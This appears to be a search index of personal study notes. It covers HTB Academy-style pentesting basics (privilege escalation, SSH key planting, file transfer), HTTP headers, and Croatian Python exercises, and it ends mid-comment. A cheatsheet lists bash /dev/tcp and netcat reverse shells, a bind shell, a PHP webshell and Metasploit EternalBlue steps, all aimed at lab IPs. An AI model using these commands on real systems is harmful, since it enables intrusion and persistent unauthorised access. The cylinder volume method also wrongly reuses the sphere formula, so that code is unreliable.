<p>Once we find a particular application we can run with <code>sudo</code>, we can look for ways to exploit it to get a shell as the root user. GTFOBins contains a list of commands and how they can be exploited through <code>sudo</code></p> <p>LOLBAS also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user.</p>"},{"location":"htb-academy/pentesting_basics/#scheduled-tasks","title":"Scheduled Tasks","text":"<p>In both Linux and Windows, there are methods to have scripts run at  specific intervals to carry out a task. Some examples are having an  anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled  tasks (Windows) or cron jobs (Linux) to escalate our privileges:</p> <ol> <li>Add new scheduled tasks/cron jobs</li> <li>Trick them to execute a malicious software</li> </ol> <p>The easiest way is to check if we are allowed to add new scheduled  tasks. In Linux, a common form of maintaining scheduled tasks is through <code>Cron Jobs</code>. There are specific directories that we may be able to utilize to add new cron jobs if we have the <code>write</code> permissions over them. These include:</p> <ol> <li><code>/etc/crontab</code></li> <li><code>/etc/cron.d</code></li> <li><code>/var/spool/cron/crontabs/root</code></li> </ol> <p>If we can write to a directory called by a cron job, we can write a  bash script with a reverse shell command, which should send us a reverse shell when executed.</p>"},{"location":"htb-academy/pentesting_basics/#exposed-credential","title":"Exposed Credential","text":"<p>Sometimes credentials are stored inf configuration files or log files  (<code>bash_history</code> in Linux and <code>PSReadLine</code> in Windows).</p> <p>We may also check for <code>Password Reuse</code>, as the system user  may have used their password for the databases, which may allow us to  use the same password to switch to that user.</p>"},{"location":"htb-academy/pentesting_basics/#ssh-keys","title":"SSH Keys","text":"<p>If we have read access over the <code>.ssh</code> directory for a specific user, we may read their private ssh keys found in <code>/home/user/.ssh/id_rsa</code> or <code>/root/.ssh/id_rsa</code>, and use it to log in to the server. </p> <p>If we find ourselves with write access to a users<code>/.ssh/</code> directory, we can place our public key in the user's ssh directory at <code>/home/user/.ssh/authorized_keys</code>. This technique is usually used to gain ssh access after gaining a shell as that user. We must first create a new key (on the attacker system) with <code>ssh-keygen</code> and the <code>-f</code> flag to specify the output file:</p> <p>\u200b                                                                                                </p> <pre><code>Bonzo@htb[/htb]$ ssh-keygen -f key\n\nGenerating public/private rsa key pair.\nEnter passphrase (empty for no passphrase): *******\nEnter same passphrase again: *******\n\nYour identification has been saved in key\nYour public key has been saved in key.pub\nThe key fingerprint is:\nSHA256:...SNIP... user@parrot\nThe key's randomart image is:\n+---[RSA 3072]----+\n|   ..o.++.+      |\n...SNIP...\n|     . ..oo+.    |\n+----[SHA256]-----+\n</code></pre> <p>This will give us two files: <code>key</code> (which we will use with <code>ssh -i</code>) and <code>key.pub</code>, which we will copy to the remote machine. Let us copy <code>key.pub</code>, then on the remote machine, we will add it into <code>/root/.ssh/authorized_keys</code>:                                                                                          </p> <pre><code>user@remotehost$ echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys\n</code></pre> <p>Now, the remote server should allow us to log in as that user by using our private key:                                             </p> <pre><code>Bonzo@htb[/htb]$ ssh root@10.10.10.10 -i key\n\nroot@remotehost# \n</code></pre>"},{"location":"htb-academy/pentesting_basics/#transfering-files","title":"Transfering files","text":"<p>During any penetration testing exercise, it is likely that we will need  to transfer files to the remote server, such as enumeration scripts or  exploits, or transfer data back to our attack host. </p> <p>First we need to start a listening server in the directory where the files we want to transfer are.</p> <pre><code>Bonzo@htb[/htb]$ cd /tmp\nBonzo@htb[/htb]$ python3 -m http.server 8000\n\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre> <p>After that we can transfer the files we need from the other host connecting to the listening python server. </p> <pre><code>user@remotehost$ wget http://10.10.14.1:8000/linenum.sh\n\n...SNIP...\nSaving to: 'linenum.sh'\n\nlinenum.sh 100%[==============================================&gt;] 144.86K  --.-KB/s    in 0.02s\n\n2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]\n</code></pre> <pre><code>user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh\n\n100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#using-base-64","title":"Using base 64","text":"<p>In some cases, we may not be able to transfer the file. For example,  the remote host may have firewall protections that prevent us from  downloading a file from our machine. In this type of situation, we can  use a simple trick to base64 encode the file into <code>base64</code> format, and then we can paste the <code>base64</code> string on the remote server and decode it. For example, if we wanted to transfer a binary file called <code>shell</code>, we can <code>base64</code> encode it as follows:</p> <pre><code>Bonzo@htb[/htb]$ base64 shell -w 0\n\nf0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU\n</code></pre> <p>Now, we can copy this <code>base64</code> string, go to the remote host, and use <code>base64 -d</code> to decode it, and pipe the output into a file:</p> <pre><code>user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d &gt; shell\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#basic-linux-tools-cheatsheet","title":"Basic Linux Tools Cheatsheet","text":"Command Description General <code>sudo openvpn user.ovpn</code> Connect to VPN <code>ifconfig</code>/<code>ip a</code> Show our IP address <code>netstat -rn</code> Show networks accessible via the VPN <code>ssh user@10.10.10.10</code> SSH to a remote server <code>ftp 10.129.42.253</code> FTP to a remote server tmux <code>tmux</code> Start tmux <code>ctrl+b ctrl+c</code> tmux: new window <code>ctrl+b 1</code> tmux: switch to window (<code>1</code>) <code>ctrl+%</code> tmux: split pane vertically <code>ctrl+\"</code> tmux: split pane horizontally <code>ctrl+-&gt;</code> tmux: switch to the right pane Vim <code>vim file</code> vim: open <code>file</code> with vim <code>esc+i</code> vim: enter <code>insert</code> mode <code>esc</code> vim: back to <code>normal</code> mode <code>x</code> vim: Cut character <code>dw</code> vim: Cut word <code>dd</code> vim: Cut full line <code>yw</code> vim: Copy word <code>yy</code> vim: Copy full line <code>p</code> vim: Paste <code>:1</code> vim: Go to line number 1. <code>:w</code> vim: Write the file 'i.e. save' <code>:q</code> vim: Quit <code>:q!</code> vim: Quit without saving <code>:wq</code> vim: Write and quit"},{"location":"htb-academy/pentesting_basics/#basic-pentesting-cheatsheet","title":"Basic Pentesting Cheatsheet","text":"Command Description Service Scanning <code>nmap 10.129.42.253</code> Run nmap on an IP <code>nmap -sV -sC -p- 10.129.42.253</code> Run an nmap script scan on an IP <code>locate scripts/citrix</code> List various available nmap scripts <code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code> Run an nmap script on an IP <code>netcat 10.10.10.10 22</code> Grab banner of an open port <code>smbclient -N -L \\\\\\\\10.129.42.253</code> List SMB Shares <code>smbclient \\\\\\\\10.129.42.253\\\\users</code> Connect to an SMB share <code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code> Scan SNMP on an IP <code>onesixtyone -c dict.txt 10.129.42.254</code> Brute force SNMP secret string Web Enumeration <code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code> Run a directory scan on a website <code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code> Run a sub-domain scan on a website <code>curl -IL https://www.inlanefreight.com</code> Grab website banner <code>whatweb 10.10.10.121</code> List details about the webserver/certificates <code>curl 10.10.10.121/robots.txt</code> List potential directories in <code>robots.txt</code> <code>ctrl+U</code> View page source (in Firefox) Public Exploits <code>searchsploit openssh 7.2</code> Search for public exploits for a web application <code>msfconsole</code> MSF: Start the Metasploit Framework <code>search exploit eternalblue</code> MSF: Search for public exploits in MSF <code>use exploit/windows/smb/ms17_010_psexec</code> MSF: Start using an MSF module <code>show options</code> MSF: Show required options for an MSF module <code>set RHOSTS 10.10.10.40</code> MSF: Set a value for an MSF module option <code>check</code> MSF: Test if the target server is vulnerable <code>exploit</code> MSF: Run the exploit on the target server is vulnerable Using Shells <code>nc -lvnp 1234</code> Start a <code>nc</code> listener on a local port <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code> Send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2&gt;&amp;1\\|nc 10.10.10.10 1234 &gt;/tmp/f</code> Another command to send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2&gt;&amp;1\\|nc -lvp 1234 &gt;/tmp/f</code> Start a bind shell on the remote server <code>nc 10.10.10.1 1234</code> Connect to a bind shell started on the remote server <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> Upgrade shell TTY (1) <code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice Upgrade shell TTY (2) <code>echo \"&lt;?php system(\\$_GET['cmd']);?&gt;\" &gt; /var/www/html/shell.php</code> Create a webshell php file <code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code> Execute a command on an uploaded webshell Privilege Escalation <code>./linpeas.sh</code> Run <code>linpeas</code> script to enumerate remote server <code>sudo -l</code> List available <code>sudo</code> privileges <code>sudo -u user /bin/echo Hello World!</code> Run a command with <code>sudo</code> <code>sudo su -</code> Switch to root user (if we have access to <code>sudo su</code>) <code>sudo su user -</code> Switch to a user (if we have access to <code>sudo su</code>) <code>ssh-keygen -f key</code> Create a new SSH key <code>echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys</code> Add the generated public key to the user <code>ssh root@10.10.10.10 -i key</code> SSH to the server with the generated private key Transferring Files <code>python3 -m http.server 8000</code> Start a local webserver <code>wget http://10.10.14.1:8000/linpeas.sh</code> Download a file on the remote server from our local machine <code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code> Download a file on the remote server from our local machine <code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> Transfer a file to the remote server with <code>scp</code> (requires SSH access) <code>base64 shell -w 0</code> Convert a file to <code>base64</code> <code>echo f0VMR...SNIO...InmDwU \\| base64 -d &gt; shell</code> Convert a file from <code>base64</code> back to its orig <code>md5sum shell</code> Check the file's <code>md5sum</code> to ensure it converted correctlyBasic Tools"},{"location":"htb-academy/template/","title":"Template","text":""},{"location":"htb-academy/web_requests/","title":"Web Requests","text":""},{"location":"htb-academy/web_requests/#introduction","title":"Introduction","text":""},{"location":"htb-academy/web_requests/#http","title":"HTTP","text":"<p><code>HyperText Transfer Protocol</code></p> <p>HTTP is a client-server protocol. The clients sends a <code>request</code> to the server and the server <code>responds</code> with a <code>ressource</code>.</p> <p>In short we can say a client makes a <code>request</code> and the server answers with a <code>response</code>.</p> <p>Resources over HTTP are accessed via a URL. A structure of an <code>url</code> is as follows:</p> <p></p> Component Description Protocol/Scheme This is used to identify the protocol being accessed by the client. This is usually <code>http</code> or <code>https</code>. Host The resource location. It can be a name (sub-domain + domain name) or an IP address Directory It can contain none or more directories. File A file can be a backend-language file like <code>php</code>, <code>jsp</code>, <code>asp</code>. It can be without extension as well Path Directories and files make up the path Query String The query string is preceded by a question mark (?). It is an optional component that is used to pass information to the resource. A query string consists of a parameter and a value. There can be multiple parameters separated by an ampersand (&amp;). Fragment/Anchor Used to locate sections within the primary resource"},{"location":"htb-academy/web_requests/#http-flow","title":"HTTP FLOW","text":"<ul> <li>client(browser) sends request inf form of an <code>URL</code>. If this is the first time a user requests this <code>URL</code>, the browser request first a DNS server to resolve the host to an IP address. </li> <li>The browsers sends a <code>GET</code> request to the resolved IP</li> <li>The server processes the <code>request</code> (looks at the headers for more information like the host, path, query string and other)</li> <li>the server returns a <code>response</code>, for example a <code>html</code> page.</li> <li>the client (browser) renders the <code>html</code>, <code>css</code>, <code>javascript</code> and displays the page </li> </ul>"},{"location":"htb-academy/web_requests/#https","title":"HTTPS","text":"<p><code>HTTPS</code> is practically the same as HTTP but with and additional TLS layer on top of it.</p> <p>On first contact the server performs an key exchange.  After the key exchange is successful, the flow continues as it would on HTTP. Depending on the circumstances, an attacker may be able to perform an HTTP downgrade attack, which downgrades HTTPS communication to HTTP. This is done by setting up a man-in-the-middle (MITM) attack and proxying (passing) all traffic through the attacker's host  without the user's knowledge.</p>"},{"location":"htb-academy/web_requests/#request-and-response-in-burp","title":"Request and Response in Burp","text":""},{"location":"htb-academy/web_requests/#request","title":"Request","text":"<p>Using https://www.google.com as an example, we can see a typical request header. On the first line we see the <code>GET</code> method that requests the <code>/</code> path using <code>HTTP/1.1</code> version of the protocol. On the next line we see it's asking the host <code>www.google.com</code> for the response</p>"},{"location":"htb-academy/web_requests/#response","title":"Response","text":"<p>The first line of the response header contains two fields,  the first being the HTTP version, while the second denotes the HTTP response code. After the header we'll get the content which the browser renders and lastly we see.</p>"},{"location":"htb-academy/web_requests/#headers","title":"Headers","text":"<p>A complete list of standard HTTP headers can be found at here.</p>"},{"location":"htb-academy/web_requests/#general-headers","title":"General Headers","text":"<p>Don't belong specifically neither to a request or response.</p> Header Description <code>Date</code> The <code>Date</code> header holds the date and time at which the message originated. It's preferred to convert the time to the standard UTC time zone. <code>Connection</code> The <code>Connection</code> header dictates if the current network  connection should stay alive after the request finishes. Two commonly  used values for this header are <code>close</code> and <code>keep-alive</code>. The <code>close</code> value from either the client or server means that they would like to terminate the connection, while the <code>keep-alive</code> header indicates that the connection should remain open. <pre><code>Bonzo@htb[/htb]$ curl -I -X GET https://www.inlanefreight.com\n\n&lt;SNIP&gt;\nDate: Sun, 06 Aug 2020 08:49:37 GMT\nConnection: keep-alive\n</code></pre>"},{"location":"htb-academy/web_requests/#entity-headers","title":"Entity Headers","text":"<p>Can be common to requests and responses.  These headers are used to describe the content (entity) being transferred by a message. They are usually found ind responses and requests containing <code>PUT</code> or <code>POST</code> methods (e.g. file uploads).</p> Header Description <code>Content-Type</code> This header is used to describe the type of resource being  transferred. The value is automatically added by the browsers on the  client-side and returned in the server response. <code>Media-Type</code> The <code>media-type</code> describes the data being passed. For example, the media-type for a PDF is <code>application/pdf</code>, while the type for a PNG image is <code>image/png</code>. This header can play a crucial role in making the server interpret our input. The <code>charset</code> field denotes the encoding standard, such as UTF-8. <code>Boundary</code> The <code>boundary</code> directive acts as a marker to separate content when there is more than one in the same message. <code>Content-Length</code> The <code>Content-Length</code> header holds the size of the entity  being passed. This header is necessary as the server uses it to read  data from the message body. <code>Content-Encoding</code> Data can undergo multiple transformations before being passed. For  example, large amounts of data can be compressed to reduce the message  size. The type of encoding being used should be specified using the <code>Content-Encoding</code> header. <pre><code>onzo@htb[/htb]$ curl -I -X GET https://www.inlanefreight.com\n\n&lt;SNIP&gt;\nContent-Length: 26012\nContent-Type: text/html; charset=ISO-8859-4\nContent-Encoding: gzip\n</code></pre>"},{"location":"htb-academy/web_requests/#request-headers","title":"Request Headers","text":"Header Description <code>Host</code> The <code>Host</code> header is used to specify the host being  queried for the resource. This can be a domain name or an IP address.  HTTP servers can be configured to host different websites, which are  revealed based on the hostname. This makes the host header an important  enumeration target. <code>User-Agent</code> The <code>User-Agent</code> header is used to describe the client  requesting resources. For example, a browser or a library. This header  can reveal a lot about the client, such as the browser, its version, and the operating system. <code>Accept</code> The <code>Accept</code> header describes which media types the client can understand. It can contain multiple media types separated by commas. The <code>*/*</code> value signifies all media types. <code>Cookie</code> The <code>Cookie</code> header should contain cookie-value pairs in the format <code>name=value</code>. HTTP is a stateless protocol, meaning the server has no way to identify clients connecting to it. This is a problem when hosting protected  resources and content. A cookie is a piece of data stored on the client and server, which acts as an  identifier. These are passed to the server per request, thus maintaining the client's access. Cookies can also serve other purposes, such as  saving user preferences or session tracking. There can be multiple  cookies in a single header separated by a semi-colon. <code>Referer</code> The <code>Referer</code> header denotes where the current request is coming from. For example, clicking a link from Google search results would make <code>https://google.com</code> the referer. Trusting this header can be dangerous as it can be easily manipulated, leading to unintended consequences. <code>Authorization</code> The <code>Authorization</code> HTTP header is another way for the  server to identify clients. After successful authentication, the server  returns a token unique to the client. Unlike cookies, tokens are stored  only on the client-side and retrieved by the server per request. There  are multiple types of authentication types based on the webserver and  application type used. <pre><code>Bonzo@htb[/htb]$ curl -I -X GET https://www.inlanefreight.com\n\nHost: www.inlanefreight.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko)\nCookie: cookie1=298zf09hf012fh2; cookie2=u32t4o3tb3gg4\nAccept: text/plain\nReferer: https://www.hackthebox.eu/\nAuthorization: BASIC cGFzc3dvcmQK\n&lt;SNIP&gt;\n</code></pre>"},{"location":"htb-academy/web_requests/#response-headers","title":"Response Headers","text":"Header Description <code>Server</code> The <code>Server</code> header contains information about the HTTP  server, which handled the request. It can be used to gain information  about the server, such as its version, and enumerate it further. <code>Set-Cookie</code> The <code>Set-Cookie</code> header contains the cookies needed for  client identification. Browsers parse the cookies and store them for  future requests. This header follows the same format as the <code>Cookie</code> header. <code>WWW-Authenticate</code> The <code>WWW-Authenticate</code> header notifies the client about the type of authentication required to access the requested resource. <pre><code>Bonzo@htb[/htb]$ curl -I -X GET https://www.inlanefreight.com\n\n&lt;SNIP&gt;\nServer: Apache/2.2.14 (Win32)\nSet-Cookie: name1=value1,name2=value2; Expires=Wed, 09 Jun 2021 10:18:14 GMT\nWWW-Authenticate: BASIC realm=\"localhost\"\n</code></pre>"},{"location":"htb-academy/web_requests/#security-headers","title":"Security Headers","text":"Header Description <code>Content-Security-Policy</code> The CSP header dictates the website's policy towards externally  injected resources. This could be JavaScript code as well as script  resources. This header instructs the browser to accept resources only  from certain trusted domains, hence preventing attacks such as Cross-site scripting. <code>Strict-Transport-Security</code> The HTTP Strict Transport Security policy of a website prevents the  browser from accessing the website over the plaintext HTTP protocol. All communication is done via the secure HTTPS protocol. This prevents  attackers from sniffing web traffic and accessing protected information  such as passwords or other sensitive data. <code>Referrer-Policy</code> This header dictates whether the browser should include the value specified via the <code>Referer</code> header or not. It can help in avoiding disclosing sensitive URLs and information while browsing the website. <pre><code>Bonzo@htb[/htb]$ curl -I -X GET https://www.inlanefreight.com\n\n&lt;SNIP&gt;\nContent-Security-Policy: script-src 'self'\nStrict-Transport-Security: max-age=31536000\nReferrer-Policy: origin\n</code></pre>"},{"location":"ifka/geometrijski_lik/","title":"Geometrijski lik","text":"<pre><code># Kugla\n# Oplosje(area, povrsina?) = O = 4 * R^2 * pi\n# Obujam(volumen?) = V = (4/3) * r^3 * pi\n# r = radius ili polumjer\n# Valjak\n# Oplosje = O =2 * r * pi * (r + h)\n# Obujam = V = r^2 * pi * h\n# r = radius = polumjer\n# h = visina valjka\n# Kvadar\n# Oplosje = O = 2 * (ab + bc +ac)\n# Obujam = V = a*b*c\n# verzija bez apstrakne glavne klase\nimport math\n\n\n# Ovo je takozvana apstraktna klasa, ona definira koje sve atribute i metode mora imati klasa koja se inheritira(???)\n# tj nasljeduje od nje. Znaci klasa ima metode ali nema implementacije nikakve. Implementacija se radi u svakoj podklasi ]\n# zasebno. Dodas samo 'pass' ispod metode i to je to\nclass Geometrijski_lik(object):\n    def oplosje(self):\n        pass\n\n    def obujam(self):\n        pass\n\n\n# Svaki geometrijski like ima svoju klasu i posto se poziva na glavnu klasu \"Geometrijski_lik), svaka ta klasa mora\n# implementirati metode koje postoje u toj klaso\n# Znaci svaka klasa (nek je primjer klasa Kugla) koju napravis sa glavnom klasom u zagradi\n# (class Kugla(Geometrijski_lik):) mora implementirat metode koje postoje u klasi Geometrijski_lik a to su obujam i\n# oplosje. TO je vazi i za klasu KVadar i Valjak i svaku drugu koju bi dodala\n# ostatak sigurno kuzis. Jedino novo je self.__radius = radius. Ovo __radius znaci da je ta varijabla samo lokalna i ne\n# moze ju mijenjat izvana sa npr. kugla.radius nego moras pozvat neku metodu da ju mijenjas naknadno.\n# To se zove enkapsulacija.\n# Npr imas klasu Racun_U_Banci koji ima varijablu/atribut stanje_racuna. Nebi bilo dobro da mozes direkno pristupiti toj\n# varijabli jer mozes upisivati kaj hoces. Bolje je preko neke metode koja prije nego promjeni stanje, provjeri neke\n# stvari dal stvarno mozes promijeniti stanje\nclass Kugla(Geometrijski_lik):\n    def __init__(self, radius):\n        self.__radius = radius\n\n    def oplosje(self):\n        return 4 * (self.__radius ** 2) * math.pi\n\n    def obujam(self):\n        return (4 / 3) * self.__radius ** 3 * math.pi\n\n\nclass Valjak(Geometrijski_lik):\n    def __init__(self, radius, duzina):\n        self.__radius = radius\n        self.__duzina = duzina\n\n    def oplosje(self):\n        return 2 * self.__radius * math.pi * (self.__radius + self.__duzina)\n\n    def obujam(self):\n        return (4 / 3) * self.__radius ** 3 * math.pi\n\n\nclass Kvadar(Geometrijski_lik):\n    def __init__(self, duzina, visina, sirina):\n        self.__duzina = duzina\n        self.__visina = visina\n        self.__sirina = sirina\n\n    def oplosje(self):\n        return 2 * (self.__duzina * self.__visina + self.__visina * self.__sirina + self.__duzina * self.__sirina)\n\n    def obujam(self):\n        return self.__duzina * self.__visina * self.__sirina\n\n\n# Ovo je kao mali meni. to je beskonacna petlja koja se vrti dok je answer true\n# IZaberes broj menija i na osnovu toga izracuna podatke za krug, valjak ili kvadar (na 2 decimale)\nanswer = True\nwhile answer:\n    print(\"\"\"\n    Izracun oplosja i opsega - Izaberi geometrijski lik\n    1. Krug\n    2. Valjak\n    3. Kvadar\n    4. Izlaz\n    \"\"\")\n    answer = input(\"Izaberi opciju? \")\n    if answer == \"1\":\n        radius = float(input(\"Upisi radius kugle: \"))\n        kugla = Kugla(radius)\n        print(f\"\"\"\n            Oplosje kugle : {kugla.oplosje():.2f}\n            Obujam kugle  : {kugla.obujam():.2f}          \"\"\")\n    elif answer == \"2\":\n        radius = float(input(\"Upisi radius valjka: \"))\n        duzina = float(input(\"Upisi duzinu valjka: \"))\n        valjak = Valjak(radius, duzina)\n        print(f\"\"\"\n            Oplosje valjka : {valjak.oplosje():.2f}\n            Obujam valjka  : {valjak.obujam():.2f}          \"\"\")\n    elif answer == \"3\":\n        duzina = float(input(\"Upisi duzinu kvadra: \"))\n        visina = float(input(\"Upisi visinu kvadra: \"))\n        sirina = float(input(\"Upisi sirinu kvadra: \"))\n        kvadar = Kvadar(duzina, visina, sirina)\n        print(f\"\"\"\n            Oplosje kvadra : {kvadar.oplosje():.2f}\n            Obujam kvadra  : {kvadar.obujam():.2f}          \"\"\")\n    elif answer == \"4\":\n        answer = False\n    elif answer != \"\":\n        print(\"\\n Izbor nije valjan\")\n</code></pre>"},{"location":"ifka/klase/","title":"Klase","text":"<pre><code># Klasa zivotinje, shvati to kao skup atributa i metoda (kaj mozes koristiti da sve zivotinje opises i kaj mozes\n# napraviti s tim, npr ispis svojstva)\n# Takve opce klase se drze na opcih stvari. Npr. klasa auto. Pitsas se koja svojstva imaju svi auti zajdnicko\n# Prema meni to bi bilo vrata a svojstvo ili atribut bi bio, broj vrata. ILi kotac, svaki auto ima kotac. Atribut\n# bi bio mozda broj kotaca\n# neki imaju 4, kamioni (koji isto spadaju u grupu automobila imaju nekad 6 i vise)\n\nclass Zivotinja:\n    def __init__(self, naziv, tip, masa, vrsta_ishrane):\n        self.naziv = naziv\n        self.tip = tip\n        self.masa = masa\n        self.vrsta_ishrane = vrsta_ishrane\n\n    # zadatak trazi metoda ispisa atributa(svojstva)\n    # tu napravis samo metodu koja uzima te varijable koje imas i ispise ih\n    def ispisi(self):\n        print(\"-------------------------------------------\")\n        print(f\"Naziv: {self.naziv}\")\n        print(f\"Tip: {self.tip}\")\n        print(f\"Masa: {self.masa}\")\n        print(f\"Vrsta ishrane: {self.vrsta_ishrane}\")\n        print(\"-------------------------------------------\")\n\n\n# to je klasa, tu je kraj kaj se tice klase\n\n# ovdje pocinje zapravo program\n# prvi \"instanciras\" klasu. To znaci iz klase napravis objekt. Klasa je zapravo samo blueprint\npas = Zivotinja(\"pas\", \"sisavac\", 15, \"svejed\")\n# I tu koristis metodut ispisi za ispis\npas.ispisi()\n\nvrabac = Zivotinja(\"vrabac\", \"ptica\", 0.005, \"biljojed\")\nvrabac.ispisi()\n</code></pre> <p>Drugi zadatak</p> <pre><code>import string\n\n\nclass Obrada_Stringa:\n    # parameterized constructor\n    def __init__(self, string):\n        self.recenica = string  # :D\n\n    # a, svaka rijec u string\n    # trazi nesto kao string to word list\n    # https://stackoverflow.com/questions/6181763/converting-a-string-to-a-list-of-words\n    def string_to_word_list(self):\n        return self.recenica.split()\n\n    # i sad radsi dalje metode za ostalo\n    def calculate_characters_in_string(self):\n        punctuation = 0\n        capital_letters = sum(1 for c in self.recenica if c.isupper())\n        normal_letters = sum(1 for c in self.recenica if c.islower())\n        numbers = sum(1 for c in self.recenica if c.isnumeric())\n        for c in self.recenica:\n            if c in string.punctuation:\n                punctuation += 1\n        print(f\"\"\"\n        Velika slova: {capital_letters}\n        Mala slova: {normal_letters}\n        Brojevi: {numbers}\n        Posebni znakovi: {punctuation}\n        \"\"\")\n\n\n# ivana = input(\"Upisi recenicu: \")\nivana = \"Ifka uci python 23 dana!!!\"\nrecenica = Obrada_Stringa(ivana)\n\n# za a:)\nprint(recenica.string_to_word_list())\n\n# b.)\nprint(recenica.calculate_characters_in_string())\n</code></pre> <p>Sa brojanjem znakova</p> <pre><code>def calculate_characters_in_string(self):\n    punctuation = 0\n    capital_letters = sum(1 for c in self.recenica if c.isupper())\n    normal_letters = sum(1 for c in self.recenica if c.islower())\n    numbers = sum(1 for c in self.recenica if c.isnumeric())\n    for c in self.recenica:\n        if c in string.punctuation:\n            punctuation += 1\n    print(f\"\"\"\n    Velika slova: {capital_letters}\n    Mala slova: {normal_letters}\n    Brojevi: {numbers}\n    Posebni znakovi: {punctuation}\n    \"\"\")\n</code></pre> <p>Cijeli zadatak, al treba jos popravljati, ispis i te stvari</p> <pre><code>import string\nimport random\n\nclass Obrada_Stringa:\n    # parameterized constructor\n    def __init__(self, sentence):\n        self.recenica = sentence\n\n\n    def get_word_list(self):\n        return self.recenica.split()\n\n    # a, svaka rijec u string\n    # trazi nesto kao string to word list\n    # https://stackoverflow.com/questions/6181763/converting-a-string-to-a-list-of-words\n    def string_to_word_list(self):\n        return self.get_word_list()\n\n    # i sad radsi dalje metode za ostalo\n    def calculate_characters_in_string(self):\n        capital_letters = sum(1 for c in self.recenica if c.isupper())\n        normal_letters = sum(1 for c in self.recenica if c.islower())\n        numbers = sum(1 for c in self.recenica if c.isnumeric())\n        punctuation = sum(1 for c in self.recenica if c in string.punctuation)\n        print(f\"\"\"\n        Velika slova: {capital_letters}\n        Mala slova: {normal_letters}\n        Brojevi: {numbers}\n        Posebni znakovi: {punctuation}\n        \"\"\")\n\n    def get_numbers_from_word_list(self):\n        brojevi = []\n        for word in self.get_word_list():\n            if word.isnumeric():\n                brojevi.append(word)\n        return brojevi\n\n    def pretvorba_u_rimske_brojeve(self, num):\n        # Storing roman values of digits from 0-9\n        # when placed at different places\n        m = [\"\", \"M\", \"MM\", \"MMM\"]\n        c = [\"\", \"C\", \"CC\", \"CCC\", \"CD\", \"D\",\n             \"DC\", \"DCC\", \"DCCC\", \"CM \"]\n        x = [\"\", \"X\", \"XX\", \"XXX\", \"XL\", \"L\",\n             \"LX\", \"LXX\", \"LXXX\", \"XC\"]\n        i = [\"\", \"I\", \"II\", \"III\", \"IV\", \"V\",\n             \"VI\", \"VII\", \"VIII\", \"IX\"]\n\n        # Converting to roman\n        thousands = m[num // 1000]\n        hundreds = c[(num % 1000) // 100]\n        tens = x[(num % 100) // 10]\n        ones = i[num % 10]\n\n        ans = (thousands + hundreds +\n               tens + ones)\n\n        return ans\n\n    def unazad_rijeci(self):\n        for rijec in self.get_word_list():\n            print(f\"{rijec[::-1]} \", end='')\n\n    def preoblikuj_unos(self):\n        characters = []\n        for char in self.recenica:\n            characters.append(char.upper())\n\n        random.shuffle(characters)\n        print(''.join(characters))\n\n    def filtriraj(self, izbor):\n        characters = []\n        if izbor in [\"b\", \"B\"]:\n            for char in self.recenica:\n                if char.isalpha() or char == ' ':\n                    characters.append(char)\n        elif izbor in [\"s\", \"S\"]:\n            for char in self.recenica:\n                if char.isnumeric() or char == ' ':\n                    characters.append(char)\n        return characters\n\n\n# ivana = input(\"Upisi recenicu: \")\nivana = \"Ifka uci python 23 dana po 6 sati !!!\"\nrecenica = Obrada_Stringa(ivana)\n\n# za a:)\nprint(recenica.string_to_word_list())\n\n# b.)\nrecenica.calculate_characters_in_string()\n\n# c.)\nfor broj in recenica.get_numbers_from_word_list():\n    print(recenica.pretvorba_u_rimske_brojeve(int(broj)))\n\n# d.)\nrecenica.unazad_rijeci()\n\n# e.)\nrecenica.preoblikuj_unos()\n\nizbor = input(\"Zelis filtrirat brojeve ili slova ? Za brojeve upisi 'b' a za slova 's': \")\nif izbor not in [\"s\", \"S\", \"b\", \"B\"]:\n    print(\"Krivi unos.\")\nelse:\n    if izbor in [\"s\",\"S\"]:\n        print(f\"Unos sa filtrirajim slovima je: {''.join(recenica.filtriraj(izbor))}\")\n    else:\n        print(f\"Unos sa filtrirajim brojevima je: {''.join(recenica.filtriraj(izbor))}\")\n</code></pre>"},{"location":"ifka/klase_final/","title":"Klase final","text":"<p>Ovo je gotov program, sa formatiranim ispisom da na nesto izglea, te sa komentarima za tebe</p> <pre><code># moramo importirati ovaj radnom jer cemo trebat funkcije iz te klase kasnije kada budemo mijesali listu\nimport random\n\n\n# ovo je funkcija convert_to_roman. Vidjet ces da je izvan klase. Razlog tome je logicke naravi. Kad gledas ta\n# konverzija i nema bas veze sa klasom, tj. me koristi nista iz klase (nikakvi self). TO je znak da se moze koristiti\n# i izvan klase, za bilo koji broj, bez obzira na objekt. Zato je izvan klase.\n# Drugi nacin, da bi koristila to bilo kad i bilo 